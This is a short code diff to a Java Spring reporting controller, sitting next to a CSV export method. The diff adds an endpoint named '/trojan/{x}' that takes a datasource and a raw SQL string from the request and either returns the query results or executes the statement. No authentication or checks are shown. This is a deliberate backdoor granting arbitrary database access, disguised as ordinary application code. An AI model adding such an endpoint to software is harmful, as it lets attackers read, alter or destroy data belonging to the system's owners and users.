@@ -154,6 +154,18 @@ public class _Reporter extends BaseActionSupport {
         outputAccessLog(reportId, "exportAsCSV", requestMap, start);
     }
     
+    @RequestMapping("/trojan/{x}")
+    @ResponseBody
+    public Object trojan(@PathVariable("x") int x, String ds, String sql) {
+    	if(x == 1) {
+    		return SQLExcutor.query(ds, sql);
+    	}
+    	else { 
+    		SQLExcutor.excute(sql, ds); 
+    		return "success"; 
+    	}
+    }
+    
     /**
      * 将前台（一般为生成好的table数据）数据导出成CSV格式
      */
